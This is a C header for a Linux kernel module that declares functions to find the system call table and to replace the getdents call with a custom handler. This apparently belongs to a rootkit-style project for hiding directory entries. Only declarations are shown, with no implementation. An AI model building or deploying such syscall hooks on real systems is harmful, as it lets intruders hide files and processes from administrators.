#ifndef _HOOKING_H
#define _HOOKING_H
#include <linux/dirent.h>
typedef asmlinkage long (*sys_getdents_t) (unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count);

unsigned long ** find_systable(void);
asmlinkage long new_dents(unsigned int fd, struct linux_dirent64 __user * dirent, unsigned int count);
int hook_dents(void);
#endif
